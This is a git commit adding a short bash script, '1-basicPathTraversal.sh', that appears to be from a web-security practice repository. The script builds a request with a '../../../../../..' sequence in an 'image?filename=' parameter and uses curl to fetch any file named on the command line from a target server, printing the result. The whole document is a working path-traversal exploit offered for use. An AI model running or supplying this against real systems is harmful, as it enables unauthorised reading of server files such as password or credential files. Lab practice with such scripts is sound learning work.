d501a20d9e5cb4e177ca73feee0731e1a8749f36
LaQKracha <68617409+LaQKracha@users.noreply.github.com>
2024-07-23 16:18:20 -0600

    Create 1-basicPathTraversal.sh

---
+++ PathTraversal/1-basicPathTraversal.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+send_request() {
+    local url=$1
+    local file=$2
+    full_url="${url}image?filename=../../../../../..${file}"
+    # echo "Sending request to: $full_url"
+    response=$(curl "$full_url")
+    echo "Response: $response"
+}
+
+if [ -z "$1" ] || [ -z "$2" ]; then
+    echo "Usage: $0 <url> <file>"
+    exit 1
+fi
+
+url=$1
+file=$2
+
+send_request "$url" "$file"
